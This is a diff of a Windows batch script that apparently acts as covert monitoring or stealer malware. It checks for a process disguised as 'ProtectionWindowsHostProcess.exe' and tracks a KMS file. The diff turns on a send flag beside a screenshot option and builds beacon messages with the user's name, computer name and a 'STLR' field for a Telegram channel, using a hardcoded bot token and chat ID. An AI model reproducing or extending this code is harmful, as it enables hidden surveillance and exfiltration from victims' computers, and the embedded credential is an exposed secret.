@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=18.0"
+set "BATCHVERSION=18.2"
 
 
 
@@ -126,7 +126,7 @@ echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=0"
+set "CheckSend=1"
 set "SENDSCREENSHOT=1"
 set "lastMinute=none"
 echo.
@@ -1373,10 +1373,13 @@ if %errorlevel%==1 (
 ) else (
     set "SHSTRUNNING=1"
     echo %SHSTFILE% is already running.
-
 )
+
+
 echo.
 echo.
+
+
 :: Check if KMSFILE is running
 powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
 if %errorlevel%==1 (
@@ -1385,8 +1388,11 @@ if %errorlevel%==1 (
 ) else (
     set "KMSRUNNING=1"
     echo %KMSFILE% is already running.
-
+    echo KMSRUNNING normal is = %KMSRUNNING%
+    echo KMSRUNNING a normal is = !KMSRUNNING!
 )
+
+echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%
 
 echo.
 echo.
@@ -1858,8 +1864,8 @@ echo CheckSend=!CheckSend!
 set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID_RUNNING=-1002163721260"
 set "TOPIC_ID_RUNNING=73779"
-:: SHST(%SHSTRUNNING%).KMS(%KMSRUNNING%)
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)||%time%|(v%BATCHVERSION%)"
+::
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%)|SHST().KMS()|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 set "CAPTION_RUNNING=This is a document for RUNNING Topic"
 set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
